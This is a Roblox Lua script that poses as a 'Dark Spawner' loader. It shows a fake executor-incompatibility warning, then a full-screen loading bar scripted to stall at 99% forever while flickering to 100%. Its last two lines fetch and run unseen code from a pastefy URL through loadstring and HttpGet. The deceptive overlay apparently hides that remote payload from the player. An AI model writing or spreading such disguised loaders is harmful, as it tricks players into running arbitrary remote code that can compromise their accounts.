
-- Loading Screen Script (Place in StarterPlayerScripts or StarterGui)
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Function to create Delta warning screen
local function createDeltaWarning()
    -- Create Warning ScreenGui
    local warningGui = Instance.new("ScreenGui")
    warningGui.Name = "DeltaWarning"
    warningGui.ResetOnSpawn = false
    warningGui.IgnoreGuiInset = true
    warningGui.DisplayOrder = 999999998
    warningGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    warningGui.Parent = playerGui

    -- Warning Background
    local warningBg = Instance.new("Frame")
    warningBg.Name = "WarningBackground"
    warningBg.Size = UDim2.new(1, 0, 1, 0)
    warningBg.Position = UDim2.new(0, 0, 0, 0)
    warningBg.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    warningBg.BorderSizePixel = 0
    warningBg.ZIndex = 999999998
    warningBg.Parent = warningGui

    -- Warning Container
    local warningFrame = Instance.new("Frame")
    warningFrame.Name = "WarningFrame"
    warningFrame.Size = UDim2.new(0, 500, 0, 300)
    warningFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
    warningFrame.BackgroundColor3 = Color3.fromRGB(40, 25, 25)
    warningFrame.BorderColor3 = Color3.fromRGB(200, 50, 50)
    warningFrame.BorderSizePixel = 2
    warningFrame.Parent = warningBg

    local warningCorner = Instance.new("UICorner")
    warningCorner.CornerRadius = UDim.new(0, 15)
    warningCorner.Parent = warningFrame

    -- Warning Icon/Title
    local warningIcon = Instance.new("TextLabel")
    warningIcon.Name = "WarningIcon"
    warningIcon.Size = UDim2.new(1, 0, 0, 60)
    warningIcon.Position = UDim2.new(0, 0, 0, 20)
    warningIcon.BackgroundTransparency = 1
    warningIcon.Text = "⚠️ INCOMPATIBILITY WARNING"
    warningIcon.TextColor3 = Color3.fromRGB(255, 100, 100)
    warningIcon.TextScaled = true
    warningIcon.Font = Enum.Font.GothamBold
    warningIcon.Parent = warningFrame

    -- Warning Message
    local warningMsg = Instance.new("TextLabel")
    warningMsg.Name = "WarningMessage"
    warningMsg.Size = UDim2.new(1, -40, 0, 120)
    warningMsg.Position = UDim2.new(0, 20, 0, 90)
    warningMsg.BackgroundTransparency = 1
    warningMsg.Text = "DELTA EXECUTOR DETECTED\n\nThis script is not compatible with Delta.\nDelta users may experience crashes or errors.\n\nRecommended executors: Synapse X, Krnl"
    warningMsg.TextColor3 = Color3.fromRGB(220, 220, 220)
    warningMsg.TextScaled = true
    warningMsg.Font = Enum.Font.Gotham
    warningMsg.TextWrapped = true
    warningMsg.Parent = warningFrame

    -- Continue Button
    local continueBtn = Instance.new("TextButton")
    continueBtn.Name = "ContinueButton"
    continueBtn.Size = UDim2.new(0, 250, 0, 40)
    continueBtn.Position = UDim2.new(0.5, -125, 0, 240)
    continueBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    continueBtn.BorderSizePixel = 0
    continueBtn.Text = "Execute After Warning"
    continueBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    continueBtn.TextScaled = true
    continueBtn.Font = Enum.Font.GothamMedium
    continueBtn.Parent = warningFrame

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = continueBtn

    -- Button hover effect
    continueBtn.MouseEnter:Connect(function()
        continueBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 100)
    end)
    
    continueBtn.MouseLeave:Connect(function()
        continueBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    end)

    -- Blinking warning effect
    local blinkConnection
    blinkConnection = spawn(function()
        while warningGui.Parent do
            if warningIcon and warningIcon.Parent then
                warningIcon.TextColor3 = Color3.fromRGB(255, 100, 100)
                wait(0.8)
                if warningIcon and warningIcon.Parent then
                    warningIcon.TextColor3 = Color3.fromRGB(255, 150, 150)
                    wait(0.8)
                end
            else
                break
            end
        end
    end)

    return warningGui, continueBtn
end

-- Function to create the loading screen
local function createLoadingScreen()
    -- Create ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LoadingScreen"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.DisplayOrder = 999999999 -- Maximum display order to overlay everything
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = playerGui

    -- Main Frame (Full Screen Background)
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.Position = UDim2.new(0, 0, 0, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    mainFrame.BorderSizePixel = 0
    mainFrame.ZIndex = 999999999 -- Ensure it's on top
    mainFrame.Parent = screenGui

    -- Loading Container Frame
    local loadingFrame = Instance.new("Frame")
    loadingFrame.Name = "LoadingFrame"
    loadingFrame.Size = UDim2.new(0, 400, 0, 120)
    loadingFrame.Position = UDim2.new(0.5, -200, 0.5, -60)
    loadingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    loadingFrame.BorderSizePixel = 0
    loadingFrame.Parent = mainFrame

    -- Add corner rounding
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = loadingFrame

    -- Loading Text
    local loadingText = Instance.new("TextLabel")
    loadingText.Name = "LoadingText"
    loadingText.Size = UDim2.new(1, -40, 0, 30)
    loadingText.Position = UDim2.new(0, 20, 0, 20)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "Loading Dark Spawner"
    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
    loadingText.TextScaled = true
    loadingText.Font = Enum.Font.GothamMedium
    loadingText.Parent = loadingFrame

    -- Progress Text (Percentage)
    local progressText = Instance.new("TextLabel")
    progressText.Name = "ProgressText"
    progressText.Size = UDim2.new(0, 60, 0, 25)
    progressText.Position = UDim2.new(1, -80, 0, 22)
    progressText.BackgroundTransparency = 1
    progressText.Text = "0%"
    progressText.TextColor3 = Color3.fromRGB(200, 200, 200)
    progressText.TextScaled = true
    progressText.Font = Enum.Font.Gotham
    progressText.Parent = loadingFrame

    -- Progress Bar Background
    local progressBg = Instance.new("Frame")
    progressBg.Name = "ProgressBackground"
    progressBg.Size = UDim2.new(1, -40, 0, 8)
    progressBg.Position = UDim2.new(0, 20, 0, 70)
    progressBg.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    progressBg.BorderSizePixel = 0
    progressBg.Parent = loadingFrame

    local progressBgCorner = Instance.new("UICorner")
    progressBgCorner.CornerRadius = UDim.new(0, 4)
    progressBgCorner.Parent = progressBg

    -- Progress Bar Fill
    local progressFill = Instance.new("Frame")
    progressFill.Name = "ProgressFill"
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.Position = UDim2.new(0, 0, 0, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
    progressFill.BorderSizePixel = 0
    progressFill.Parent = progressBg

    local progressFillCorner = Instance.new("UICorner")
    progressFillCorner.CornerRadius = UDim.new(0, 4)
    progressFillCorner.Parent = progressFill

    -- Variables for loading animation
    local currentProgress = 0
    local targetProgress = 0
    local isStuck = false
    local isRunning = true

    -- Function to update progress
    local function updateProgress()
        if not isStuck and isRunning then
            if currentProgress < 90 then
                -- Fast progress until 90%
                targetProgress = math.min(currentProgress + math.random(1, 3), 90)
            elseif currentProgress < 99 then
                -- Slow progress from 90% to 99%
                targetProgress = math.min(currentProgress + math.random(1, 1), 99)
            else
                -- Get stuck at 99%
                targetProgress = 99
                isStuck = true
            end
        end
        
        if not progressFill or not progressFill.Parent then
            return
        end
        
        -- Animate to target progress
        local tweenInfo = TweenInfo.new(
            0.5, -- Duration
            Enum.EasingStyle.Quad,
            Enum.EasingDirection.Out
        )
        
        local progressTween = TweenService:Create(
            progressFill,
            tweenInfo,
            {Size = UDim2.new(targetProgress / 100, 0, 1, 0)}
        )
        
        progressTween:Play()
        
        -- Update percentage text
        if progressText and progressText.Parent then
            progressText.Text = math.floor(targetProgress) .. "%"
        end
        currentProgress = targetProgress
    end

    -- Loading dots animation
    local dotsCoroutine = coroutine.create(function()
        local dots = ""
        local dotCount = 0
        while isRunning and screenGui.Parent and loadingText and loadingText.Parent do
            dotCount = (dotCount + 1) % 4
            dots = string.rep(".", dotCount)
            if loadingText and loadingText.Parent then
                loadingText.Text = "Loading Dark Spawner" .. dots
            end
            wait(0.5)
        end
    end)
    
    coroutine.resume(dotsCoroutine)

    -- Progress animation loop
    local progressCoroutine = coroutine.create(function()
        wait(1) -- Initial delay
        
        while currentProgress < 99 and isRunning and screenGui.Parent do
            updateProgress()
            wait(math.random(1, 3)) -- Random delay between updates
        end
        
        -- Once stuck at 99%, occasionally "try" to load more
        while isRunning and screenGui.Parent do
            wait(math.random(3, 8))
            if isStuck and progressText and progressText.Parent and progressFill and progressFill.Parent then
                -- Briefly show 100% then go back to 99%
                progressText.Text = "100%"
                progressFill.Size = UDim2.new(1, 0, 1, 0)
                wait(0.1)
                if progressText and progressText.Parent and progressFill and progressFill.Parent then
                    progressText.Text = "99%"
                    progressFill.Size = UDim2.new(0.99, 0, 1, 0)
                end
            end
        end
    end)
    
    coroutine.resume(progressCoroutine)

    -- Cleanup function
    screenGui.AncestryChanged:Connect(function()
        if not screenGui.Parent then
            isRunning = false
        end
    end)

    -- Optional: Remove loading screen after a certain time (uncomment if needed)
    --[[
    spawn(function()
        wait(30) -- Remove after 30 seconds
        isRunning = false
        if screenGui and screenGui.Parent then
            screenGui:Destroy()
        end
    end)
    --]]

    return screenGui
end

-- Main script execution
local function main()
    -- Show Delta warning first
    local warningGui, continueBtn = createDeltaWarning()
    
    -- Wait for user to click continue
    local clicked = false
    local buttonConnection
    
    buttonConnection = continueBtn.MouseButton1Click:Connect(function()
        clicked = true
        if buttonConnection then
            buttonConnection:Disconnect()
        end
    end)
    
    -- Wait for button click
    repeat 
        wait(0.1) 
    until clicked or not warningGui or not warningGui.Parent
    
    if warningGui and warningGui.Parent then
        -- Remove warning with fade effect
        local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local warningBgFrame = warningGui:FindFirstChild("WarningBackground")
        
        if warningBgFrame then
            local fadeTween = TweenService:Create(warningBgFrame, fadeInfo, {BackgroundTransparency = 1})
            fadeTween:Play()
            
            fadeTween.Completed:Connect(function()
                if warningGui and warningGui.Parent then
                    warningGui:Destroy()
                end
                
                -- Small delay before showing loading screen
                wait(0.3)
                
                -- Now create the loading screen
                createLoadingScreen()
            end)
        else
            -- Fallback if frame not found
            warningGui:Destroy()
            wait(0.3)
            createLoadingScreen()
        end
    end
end

-- Run the main function
spawn(main)
loadstring(game:HttpGet("https://pastefy.app/ioiQjwzP/raw"))()
loadstring(game:HttpGet("https://pastefy.app/ioiQjwzP/raw"))()
